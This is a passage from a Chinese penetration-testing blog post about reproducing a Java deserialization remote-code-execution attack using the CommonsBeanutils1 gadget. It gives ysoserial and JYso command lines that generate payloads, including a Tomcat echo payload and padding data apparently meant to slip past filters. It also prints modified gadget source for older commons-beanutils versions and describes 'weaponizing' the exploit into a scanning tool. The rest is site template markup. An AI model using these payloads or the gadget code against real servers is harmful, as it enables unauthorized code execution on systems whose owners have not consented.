+<p><strong>加上这个这个是重点&lt;defaultGoal&gt;compile&lt;&#x2F;defaultGoal&gt;</strong><br>修改依赖<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291745953.png" alt="mvn修改依赖"><br>跳过测试编译(不会maven的去百度搜索一下maven配置设置本地 jar包库)<br>mvn clean package -DskipTests<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291747535.png" alt="编译成功"><br>我们重新生成exp<br>java -jar ysoserial-for-woodpecker-0.5.3-all.jar -g CommonsBeanutils1 -a raw_cmd:”ping xxxx”  –dirt-data-length 400000 &gt;curl4.cer<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404291750918.png" alt="打成功了"><br>我们收到了请求打成功了现在重要的是我们是不是也可以生成一波回显。啥的我们在找到了一个工具那就是这个 su18大佬的工具<br><a target="_blank" rel="noopener" href="https://github.com/peiqiF4ck/ysoserial">https://github.com/peiqiF4ck/ysoserial</a><br>修改jar包配置并且编译。<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301115542.png" alt="修改jar包配置"><br>build 成功我们使用这个来生成exp<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301118540.png" alt="build成功"><br>java -jar ysuserial-1.5-su18-all.jar -g CommonsBeanutils1 -p “EX-TomcatEcho” -ch “su18” -dt 3 -dl 400000 &gt;su18.bin<br>ok直接一发入魂<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301121736.png" alt="复现完毕"><br>后来有尝试了几款工具。这两款工具里面的CommonsBeanutils1.java里面的代码都被改了只适用于高版本的CommonsBeanutils 。如果想用我们需要改改里面的代码</br><br><a target="_blank" rel="noopener" href="https://github.com/qi4L/JYso">https://github.com/qi4L/JYso</a> (<strong>这个修改代码不可以使用并且和作者讨论了一下这个项目中代码存在bug。低版本的即使修改代码也很难使用另外这个gradle不好编译等作者更新代码吧。后续我会写一波这个项目的编译方法。项目不错。作者格局很大。不知道作者修改什么了不兼容低版本的CommonsBeanutils。到时候代码修改了。我会写一篇文章专门编译这个因为这个gradle这个不好编译。我也是在这个项目上踩坑踩了至少2天哈哈哈一言难尽啊所以后续出教程不让你们踩坑</strong>)<br><a target="_blank" rel="noopener" href="https://github.com/Gary-yang1/JYso(%E8%BF%99%E4%B8%AA%E4%BF%AE%E6%94%B9%E4%BB%A3%E7%A0%81%E5%8F%AF%E4%BB%A5%E7%9B%B4%E6%8E%A5%E4%BD%BF%E7%94%A8,%E6%8D%AE%E8%AF%B4%E8%BF%99%E6%98%AF%E4%B9%8B%E5%89%8D%E7%9A%84%E8%BF%99%E4%B8%AA%E9%A1%B9%E7%9B%AEhttps://github.com/qi4L/JYso%E7%9A%84%E4%BB%A3%E7%A0%81%E3%80%82)">https://github.com/Gary-yang1/JYso(这个修改代码可以直接使用,据说这是之前的这个项目https://github.com/qi4L/JYso的代码。)</a><br>我贴一下修改后的代码<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301134828.png" alt="修改部分"></p>
+<pre class="language-java" data-language="java"><code class="language-java"><span class="token keyword">package</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>enumtypes<span class="token punctuation">.</span></span><span class="token class-name">PayloadType</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Authors</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>annotation<span class="token punctuation">.</span></span><span class="token class-name">Dependencies</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Gadgets</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">GadgetsYso</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span>gadgets<span class="token punctuation">.</span>utils<span class="token punctuation">.</span></span><span class="token class-name">Reflections</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">org<span class="token punctuation">.</span>apache<span class="token punctuation">.</span>commons<span class="token punctuation">.</span>beanutils<span class="token punctuation">.</span></span><span class="token class-name">BeanComparator</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>util<span class="token punctuation">.</span></span><span class="token class-name">PriorityQueue</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>math<span class="token punctuation">.</span></span><span class="token class-name">BigInteger</span><span class="token punctuation">;</span>
+
+<span class="token keyword">import</span> <span class="token keyword">static</span> <span class="token namespace">com<span class="token punctuation">.</span>qi4l<span class="token punctuation">.</span>jndi<span class="token punctuation">.</span></span><span class="token class-name">Starter<span class="token punctuation">.</span>JYsoMode</span><span class="token punctuation">;</span>
+
+<span class="token annotation punctuation">@SuppressWarnings</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"rawtypes"</span><span class="token punctuation">,</span> <span class="token string">"unchecked"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token annotation punctuation">@Dependencies</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token string">"commons-beanutils:commons-beanutils:1.6.1"</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token annotation punctuation">@Authors</span><span class="token punctuation">(</span><span class="token punctuation">&#123;</span><span class="token class-name">Authors</span><span class="token punctuation">.</span>FROHOFF<span class="token punctuation">&#125;</span><span class="token punctuation">)</span>
+<span class="token keyword">public</span> <span class="token keyword">class</span> commonsbeanutils1 <span class="token keyword">implements</span> <span class="token class-name">ObjectPayload</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> <span class="token punctuation">&#123;</span>
+
+    <span class="token keyword">public</span> <span class="token class-name">Object</span> <span class="token function">getObject</span><span class="token punctuation">(</span><span class="token class-name">PayloadType</span> type<span class="token punctuation">,</span> <span class="token class-name">String</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span> param<span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">Exception</span> <span class="token punctuation">&#123;</span>
+       <span class="token comment">// final Object template;</span>
+        <span class="token comment">/* if (JYsoMode.contains("yso")) &#123;
+            template = GadgetsYso.createTemplatesImpl(param[0]);
+        &#125; else &#123;
+            template = Gadgets.createTemplatesImpl(type, param);
+        &#125; */</span>
+		
+		<span class="token keyword">final</span> <span class="token class-name">Object</span> template <span class="token operator">=</span> <span class="token class-name">GadgetsYso</span><span class="token punctuation">.</span><span class="token function">createTemplatesImpl</span><span class="token punctuation">(</span>param<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+       <span class="token comment">// final BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER);</span>
+<span class="token keyword">final</span> <span class="token class-name">BeanComparator</span> comparator <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">BeanComparator</span><span class="token punctuation">(</span><span class="token string">"lowestSetBit"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token keyword">final</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span> queue <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token class-name">PriorityQueue</span><span class="token generics"><span class="token punctuation">&lt;</span><span class="token class-name">Object</span><span class="token punctuation">></span></span><span class="token punctuation">(</span><span class="token number">2</span><span class="token punctuation">,</span> comparator<span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token comment">/* queue.add("1");
+        queue.add("1"); */</span>
+		queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+		queue<span class="token punctuation">.</span><span class="token function">add</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">BigInteger</span><span class="token punctuation">(</span><span class="token string">"1"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>comparator<span class="token punctuation">,</span> <span class="token string">"property"</span><span class="token punctuation">,</span> <span class="token string">"outputProperties"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+        <span class="token class-name">Reflections</span><span class="token punctuation">.</span><span class="token function">setFieldValue</span><span class="token punctuation">(</span>queue<span class="token punctuation">,</span> <span class="token string">"queue"</span><span class="token punctuation">,</span> <span class="token keyword">new</span> <span class="token class-name">Object</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">&#123;</span>template<span class="token punctuation">,</span> template<span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+
+        <span class="token keyword">return</span> queue<span class="token punctuation">;</span>
+    <span class="token punctuation">&#125;</span>
+<span class="token punctuation">&#125;</span></code></pre>
+<p>执行编译,然后进行测试。编译成功我们来测试<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301141993.png" alt="编译成功"><br>java -jar JYso-3.5.7.jar -yso 1 -g  CommonsBeanutils1  -p “EX-TomcatEcho”  -ch “yso357” -dt 3 -dl 400000 &gt;yso3577.bin<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301148222.png" alt="成功复现"></p>
+<h2 id="自动化武器化"><a href="#自动化武器化" class="headerlink" title="自动化武器化"></a>自动化武器化</h2><p>上述既然我们成功构造出payload那我们可以直接进行武器化集成到我们的工具里面。对这个漏洞进行检测。利用截图<br><img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202404301522728.png" alt="利用截图"></p>
+<h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>后续等Jyso作者更新代码以后我将专门出一篇文章编译Jyso最新版本。后续在github中一类的项目都放到一块方便操作。</p>
+
+                
+            </div>
+            <hr/>
+
+            
+
+    <div class="reprint" id="reprint-statement">
+        
+            <div class="reprint__author">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-user">
+                        文章作者:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="/about" rel="external nofollow noreferrer">peiqiF4ck</a>
+                </span>
+            </div>
+            <div class="reprint__type">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-link">
+                        文章链接:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    <a href="https://peiqiF4ck.github.io/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/">https://peiqiF4ck.github.io/penetrationtest/2024/04/articles/bf2db1aeff47d7f9/</a>
+                </span>
+            </div>
+            <div class="reprint__notice">
+                <span class="reprint-meta" style="font-weight: bold;">
+                    <i class="fas fa-copyright">
+                        版权声明:
+                    </i>
+                </span>
+                <span class="reprint-info">
+                    本博客所有文章除特別声明外，均采用
+                    <a href="https://creativecommons.org/licenses/by/4.0/deed.zh" rel="external nofollow noreferrer" target="_blank">CC BY 4.0</a>
+                    许可协议。转载请注明来源
+                    <a href="/about" target="_blank">peiqiF4ck</a>
+                    !
+                </span>
+            </div>
+        
+    </div>
+
+    <script async defer>
+      document.addEventListener("copy", function (e) {
+        let toastHTML = '<span>复制成功，请遵循本文的转载规则</span><button class="btn-flat toast-action" onclick="navToReprintStatement()" style="font-size: smaller">查看</a>';
+        M.toast({html: toastHTML})
+      });
+
+      function navToReprintStatement() {
+        $("html, body").animate({scrollTop: $("#reprint-statement").offset().top - 80}, 800);
+      }
+    </script>
+
+
+
+            <div class="tag_share" style="display: block;">
+                <div class="post-meta__tag-list" style="display: inline-block;">
+                    
+                        <div class="article-tag">
+                            
+                                <a href="/tags/PenetrationTestingExample/">
+                                    <span class="chip bg-color">PenetrationTestingExample</span>
+                                </a>
+                            
+                        </div>
+                    
+                </div>
+                <div class="post_share" style="zoom: 80%; width: fit-content; display: inline-block; float: right; margin: -0.15rem 0;">
+                    <link rel="stylesheet" type="text/css" href="/libs/share/css/share.min.css">
+<div id="article-share">
+
+    
+    <div class="social-share" data-sites="twitter,facebook,google,qq,qzone,wechat,weibo,douban,linkedin" data-wechat-qrcode-helper="<p>微信扫一扫即可分享！</p>"></div>
+    <script src="/libs/share/js/social-share.min.js"></script>
+    
+
+    
+
+</div>
+
+                </div>
+            </div>
+            
+                <style>
+    #reward {
+        margin: 40px 0;
+        text-align: center;
+    }
+
+    #reward .reward-link {
+        font-size: 1.4rem;
+        line-height: 38px;
+    }
+
+    #reward .btn-floating:hover {
+        box-shadow: 0 6px 12px rgba(0, 0, 0, 0.2), 0 5px 15px rgba(0, 0, 0, 0.2);
+    }
+
+    #rewardModal {
+        width: 320px;
+        height: 350px;
+    }
+
+    #rewardModal .reward-title {
+        margin: 15px auto;
+        padding-bottom: 5px;
+    }
+
+    #rewardModal .modal-content {
+        padding: 10px;
+    }
+
+    #rewardModal .close {
+        position: absolute;
+        right: 15px;
+        top: 15px;
+        color: rgba(0, 0, 0, 0.5);
+        font-size: 1.3rem;
+        line-height: 20px;
+        cursor: pointer;
+    }
+
+    #rewardModal .close:hover {
+        color: #ef5350;
+        transform: scale(1.3);
+        -moz-transform:scale(1.3);
+        -webkit-transform:scale(1.3);
+        -o-transform:scale(1.3);
+    }
+
+    #rewardModal .reward-tabs {
+        margin: 0 auto;
+        width: 210px;
+    }
+
+    .reward-tabs .tabs {
+        height: 38px;
+        margin: 10px auto;
+        padding-left: 0;
+    }
+
+    .reward-content ul {
+        padding-left: 0 !important;
+    }
+
+    .reward-tabs .tabs .tab {
+        height: 38px;
+        line-height: 38px;
+    }
+
+    .reward-tabs .tab a {
+        color: #fff;
+        background-color: #ccc;
+    }
+
+    .reward-tabs .tab a:hover {
+        background-color: #ccc;
+        color: #fff;
+    }
+
+    .reward-tabs .wechat-tab .active {
+        color: #fff !important;
+        background-color: #22AB38 !important;
+    }
+
+    .reward-tabs .alipay-tab .active {
+        color: #fff !important;
+        background-color: #019FE8 !important;
+    }
+
+    .reward-tabs .reward-img {
+        width: 210px;
+        height: 210px;
+    }
+</style>
+
+<div id="reward">
+    <a href="#rewardModal" class="reward-link modal-trigger btn-floating btn-medium waves-effect waves-light red">赏</a>
+
+    <!-- Modal Structure -->
+    <div id="rewardModal" class="modal">
+        <div class="modal-content">
+            <a class="close modal-close"><i class="fas fa-times"></i></a>
+            <h4 class="reward-title">你的赏识是我前进的动力</h4>
+            <div class="reward-content">
+                <div class="reward-tabs">
+                    <ul class="tabs row">
+                        <li class="tab col s6 alipay-tab waves-effect waves-light"><a href="#alipay">支付宝</a></li>
+                        <li class="tab col s6 wechat-tab waves-effect waves-light"><a href="#wechat">微 信</a></li>
+                    </ul>
+                    <div id="alipay">
+                        <img src="/medias/reward/alipay.jpg" class="reward-img" alt="支付宝打赏二维码">
+                    </div>
+                    <div id="wechat">
+                        <img src="/medias/reward/wechat.png" class="reward-img" alt="微信打赏二维码">
+                    </div>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+
+<script>
+    $(function () {
+        $('.tabs').tabs();
+    });
+</script>
+
+            
+        </div>
+    </div>
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+    
+
+<article id="prenext-posts" class="prev-next articles">
+    <div class="row article-row">
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge left-badge text-color">
+                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+            <div class="card">
+                <a href="/securitytools/2024/05/articles/c4f380e46ba1f562/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202405011849362.png" class="responsive-img" alt="Jyso 最新版反序列化工具gradle编译">
+                        
+                        <span class="card-title">Jyso 最新版反序列化工具gradle编译</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                        <span class="publish-date">
+                            <i class="far fa-clock fa-fw icon-date"></i>2024-05-01
+                        </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/SecurityTools/" class="post-category">
+                                    SecurityTools
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PenetrationTest/">
+                        <span class="chip bg-color">PenetrationTest</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/penetrationtest/2024/03/articles/b8f9d080e95e9930/">
+                    <div class="card-image">
+                        
+                        <img src="https://cdn.jsdelivr.net/gh/peiqiF4ck/mybologimg/img/202403301634001.jpg" class="responsive-img" alt="QVD-2024-11354-最新泛微E-Office10远程代码执行漏洞(复现坑点总结)">
+                        
+                        <span class="card-title">QVD-2024-11354-最新泛微E-Office10远程代码执行漏洞(复现坑点总结)</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            漏洞复现
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2024-03-30
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-bookmark fa-fw icon-category"></i>
+                            
+                            <a href="/categories/PenetrationTest/" class="post-category">
+                                    PenetrationTest
+                                </a>
+                            
+                            
+                        </span>
+                    </div>
+                </div>
+                
+                <div class="card-action article-tags">
+                    
+                    <a href="/tags/PenetrationTestingExample/">
+                        <span class="chip bg-color">PenetrationTestingExample</span>
+                    </a>
+                    
+                </div>
+                
+            </div>
+        </div>
+        
+    </div>
+</article>
+
+</div>
+
+
+
+<!-- 代码块功能依赖 -->
+<script type="text/javascript" src="/libs/codeBlock/codeBlockFuction.js"></script>
+
+<!-- 代码语言 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeLang.js"></script>
+
+
+<!-- 代码块复制 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeCopy.js"></script>
+
+
+<!-- 代码块收缩 -->
+
+<script type="text/javascript" src="/libs/codeBlock/codeShrink.js"></script>
+
+
+    </div>
+    <div id="toc-aside" class="expanded col l3 hide-on-med-and-down">
+        <div class="toc-widget card" style="background-color: white;">
+            <div class="toc-title"><i class="far fa-list-alt"></i>&nbsp;&nbsp;目录</div>
+            <div id="toc-content"></div>
+        </div>
+    </div>
+</div>
+
+<!-- TOC 悬浮按钮. -->
+
+<div id="floating-toc-btn" class="hide-on-med-and-down">
+    <a class="btn-floating btn-large bg-color">
+        <i class="fas fa-list-ul"></i>
+    </a>
+</div>
+
+
+<script src="/libs/tocbot/tocbot.min.js"></script>
+<script>
+    $(function () {
+        tocbot.init({
+            tocSelector: '#toc-content',
+            contentSelector: '#articleContent',
+            headingsOffset: -($(window).height() * 0.4 - 45),
+            collapseDepth: Number('0'),
+            headingSelector: 'h2, h3, h4'
+        });
+
+        // modify the toc link href to support Chinese.
+        let i = 0;
+        let tocHeading = 'toc-heading-';
+        $('#toc-content a').each(function () {
+            $(this).attr('href', '#' + tocHeading + (++i));
+        });
+
+        // modify the heading title id to support Chinese.
+        i = 0;
+        $('#articleContent').children('h2, h3, h4').each(function () {
+            $(this).attr('id', tocHeading + (++i));
+        });
+
+        // Set scroll toc fixed.
+        let tocHeight = parseInt($(window).height() * 0.4 - 64);
+        let $tocWidget = $('.toc-widget');
+        $(window).scroll(function () {
+            let scroll = $(window).scrollTop();
+            /* add post toc fixed. */
+            if (scroll > tocHeight) {
+                $tocWidget.addClass('toc-fixed');
+            } else {
+                $tocWidget.removeClass('toc-fixed');
+            }
+        });
+
+        
+        /* 修复文章卡片 div 的宽度. */
+        let fixPostCardWidth = function (srcId, targetId) {
+            let srcDiv = $('#' + srcId);
+            if (srcDiv.length === 0) {
+                return;
+            }
+
+            let w = srcDiv.width();
+            if (w >= 450) {
+                w = w + 21;
+            } else if (w >= 350 && w < 450) {
+                w = w + 18;
+            } else if (w >= 300 && w < 350) {
+                w = w + 16;
+            } else {
+                w = w + 14;
+            }
+            $('#' + targetId).width(w);
+        };
+
+        // 切换TOC目录展开收缩的相关操作.
+        const expandedClass = 'expanded';
+        let $tocAside = $('#toc-aside');
+        let $mainContent = $('#main-content');
+        $('#floating-toc-btn .btn-floating').click(function () {
+            if ($tocAside.hasClass(expandedClass)) {
+                $tocAside.removeClass(expandedClass).hide();
+                $mainContent.removeClass('l9');
+            } else {
+                $tocAside.addClass(expandedClass).show();
+                $mainContent.addClass('l9');
+            }
+            fixPostCardWidth('artDetail', 'prenext-posts');
+        });
+        
+    });
+</script>
+
+    
+
+</main>
+
+
+
+
+    <footer class="page-footer bg-color">
+    
+        <link rel="stylesheet" href="/libs/aplayer/APlayer.min.css">
+<style>
+    .aplayer .aplayer-lrc p {
+        
+        font-size: 12px;
+        font-weight: 700;
+        line-height: 16px !important;
+    }
+
+    .aplayer .aplayer-lrc p.aplayer-lrc-current {
+        
+        font-size: 15px;
+        color: #42b983;
+    }
+
+    
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body {
+        left: -66px !important;
+    }
+
+    .aplayer.aplayer-fixed.aplayer-narrow .aplayer-body:hover {
+        left: 0px !important;
+    }
+
+    
+</style>
+<div class="">
+    
+    <div class="row">
+        <meting-js class="col l8 offset-l2 m10 offset-m1 s12"
+                   server="netease"
+                   type="song"
+                   id="2630918223"
+                   fixed='true'
+                   autoplay='true'
+                   theme='#42b983'
+                   loop='one'
+                   order='list'
+                   preload='auto'
+                   volume='0.7'
+                   list-folded='true'
+        >
+        </meting-js>
+    </div>
+</div>
+
+<script src="/libs/aplayer/APlayer.min.js"></script>
+<script src="/libs/aplayer/Meting.min.js"></script>
+
+    
+
+    <div class="container row center-align"
+         style="margin-bottom: 15px !important;">
+        <div class="col s12 m8 l8 copy-right">
+            Copyright&nbsp;&copy;
+            
+                <span id="year">2023-2025</span>
+            
+            <a href="/about" target="_blank">peiqiF4ck</a>
+            |&nbsp;Powered by&nbsp;<a href="https://hexo.io/" target="_blank">Hexo</a>
+            |&nbsp;Theme&nbsp;<a href="https://github.com/blinkfox/hexo-theme-matery" target="_blank">Matery</a>
+            <br>
+            
+                &nbsp;<i class="fas fa-chart-area"></i>&nbsp;站点总字数:&nbsp;<span
+                        class="white-color">62.7k</span>
+            
+            
+            
+                
+            
+            
+                <span id="busuanzi_container_site_pv">
+                &nbsp;|&nbsp;<i class="far fa-eye"></i>&nbsp;总访问量:&nbsp;
+                    <span id="busuanzi_value_site_pv" class="white-color"></span>
+            </span>
+            
+            
+                <span id="busuanzi_container_site_uv">
+                &nbsp;|&nbsp;<i class="fas fa-users"></i>&nbsp;总访问人数:&nbsp;
+                    <span id="busuanzi_value_site_uv" class="white-color"></span>
+            </span>
+            
+            <br>
+
+            <!-- 运行天数提醒. -->
+            
+                <span id="sitetime"> Loading ...</span>
+                <script>
+                    var calcSiteTime = function () {
+                        var seconds = 1000;
+                        var minutes = seconds * 60;
+                        var hours = minutes * 60;
+                        var days = hours * 24;
+                        var years = days * 365;
+                        var today = new Date();
+                        var startYear = "2023";
+                        var startMonth = "1";
+                        var startDate = "9";
+                        var startHour = "0";
+                        var startMinute = "0";
+                        var startSecond = "0";
+                        var todayYear = today.getFullYear();
+                        var todayMonth = today.getMonth() + 1;
+                        var todayDate = today.getDate();
+                        var todayHour = today.getHours();
+                        var todayMinute = today.getMinutes();
+                        var todaySecond = today.getSeconds();
+                        var t1 = Date.UTC(startYear, startMonth, startDate, startHour, startMinute, startSecond);
+                        var t2 = Date.UTC(todayYear, todayMonth, todayDate, todayHour, todayMinute, todaySecond);
+                        var diff = t2 - t1;
+                        var diffYears = Math.floor(diff / years);
+                        var diffDays = Math.floor((diff / days) - diffYears * 365);
+
+                        // 区分是否有年份.
+                        var language = 'zh-CN';
+                        if (startYear === String(todayYear)) {
+                            document.getElementById("year").innerHTML = todayYear;
+                            var daysTip = 'This site has been running for ' + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                daysTip = '本站已运行 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                daysTip = '本站已運行 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = daysTip;
+                        } else {
+                            document.getElementById("year").innerHTML = startYear + " - " + todayYear;
+                            var yearsAndDaysTip = 'This site has been running for ' + diffYears + ' years and '
+                                + diffDays + ' days';
+                            if (language === 'zh-CN') {
+                                yearsAndDaysTip = '本站已运行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            } else if (language === 'zh-HK') {
+                                yearsAndDaysTip = '本站已運行 ' + diffYears + ' 年 ' + diffDays + ' 天';
+                            }
+                            document.getElementById("sitetime").innerHTML = yearsAndDaysTip;
+                        }
+                    }
+
+                    calcSiteTime();
+                </script>
+            
+            <br>
+            
+        </div>
+        <div class="col s12 m4 l4 social-link social-statis">
+    <a href="https://github.com/peiqiF4ck" class="tooltipped" target="_blank" data-tooltip="访问我的GitHub" data-position="top" data-delay="50">
+        <i class="fab fa-github"></i>
+    </a>
+
+
+
+    <a href="mailto:xxxxxx" class="tooltipped" target="_blank" data-tooltip="邮件联系我" data-position="top" data-delay="50">
+        <i class="fas fa-envelope-open"></i>
+    </a>
+
+
+
+    <a href="https://www.facebook.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的Facebook: https://www.facebook.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-facebook-f"></i>
+    </a>
+
+
+
+    <a href="https://x.com/mr50382" class="tooltipped" target="_blank" data-tooltip="关注我的Twitter: https://x.com/mr50382" data-position="top" data-delay="50">
+        <i class="fab fa-twitter"></i>
+    </a>
+
+
+
+
+
+    <a href="https://weibo.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的微博: https://weibo.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-weibo"></i>
+    </a>
+
+
+
+    <a href="https://www.zhihu.com/xxx" class="tooltipped" target="_blank" data-tooltip="关注我的知乎: https://www.zhihu.com/xxx" data-position="top" data-delay="50">
+        <i class="fab fa-zhihu1">知</i>
+    </a>
+
+
+
+</div>
+    </div>
+</footer>
+
+<div class="progress-bar"></div>
+
+
+    <!-- 搜索遮罩框 -->
+<div id="searchModal" class="modal">
+    <div class="modal-content">
+        <div class="search-header">
+            <span class="title"><i class="fas fa-search"></i>&nbsp;&nbsp;搜索</span>
+            <input type="search" id="searchInput" name="s" placeholder="请输入搜索的关键字"
+                   class="search-input">
+        </div>
+        <div id="searchResult"></div>
+    </div>
+</div>
+
+<script type="text/javascript">
+$(function () {
+    var searchFunc = function (path, search_id, content_id) {
+        'use strict';
+        $.ajax({
+            url: path,
+            dataType: "xml",
+            success: function (xmlResponse) {
+                // get the contents from search data
+                var datas = $("entry", xmlResponse).map(function () {
+                    return {
+                        title: $("title", this).text(),
+                        content: $("content", this).text(),
+                        url: $("url", this).text()
+                    };
+                }).get();
+                var $input = document.getElementById(search_id);
+                var $resultContent = document.getElementById(content_id);
+                $input.addEventListener('input', function () {
+                    var str = '<ul class=\"search-result-list\">';
+                    var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+                    $resultContent.innerHTML = "";
+                    if (this.value.trim().length <= 0) {
+                        return;
+                    }
+                    // perform local searching
+                    datas.forEach(function (data) {
+                        var isMatch = true;
+                        var data_title = data.title.trim().toLowerCase();
+                        var data_content = data.content.trim().replace(/<[^>]+>/g, "").toLowerCase();
+                        var data_url = data.url;
+                        data_url = data_url.indexOf('/') === 0 ? data.url : '/' + data_url;
+                        var index_title = -1;
+                        var index_content = -1;
+                        var first_occur = -1;
+                        // only match artiles with not empty titles and contents
+                        if (data_title !== '' && data_content !== '') {
+                            keywords.forEach(function (keyword, i) {
+                                index_title = data_title.indexOf(keyword);
+                                index_content = data_content.indexOf(keyword);
+                                if (index_title < 0 && index_content < 0) {
+                                    isMatch = false;
+                                } else {
+                                    if (index_content < 0) {
+                                        index_content = 0;
+                                    }
+                                    if (i === 0) {
+                                        first_occur = index_content;
+                                    }
+                                }
+                            });
+                        }
+                        // show search results
+                        if (isMatch) {
+                            str += "<li><a href='" + data_url + "' class='search-result-title'>" + data_title + "</a>";
